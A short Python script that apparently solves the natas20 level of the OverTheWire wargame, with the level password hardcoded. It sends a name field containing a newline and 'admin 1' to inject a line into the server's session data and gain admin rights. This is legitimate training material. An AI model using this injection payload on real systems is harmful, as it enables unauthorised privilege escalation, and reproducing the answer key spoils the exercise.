#!/usr/bin/python3
import requests
import hashlib
username = "natas20"
password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"

data = {"name" : "shlomi\nadmin 1"}

url = 'http://'+username+'.natas.labs.overthewire.org/?debug=true'
session = requests.session()
response = session.get(url, auth = (username, password))
content = response.text
print(content)
print("------------------------------------------------------------------------------")
response = session.post(url, data = data ,auth = (username, password))
content = response.text
print(content)
print("------------------------------------------------------------------------------")

response = session.get(url,auth = (username, password))
content = response.text
print(content)

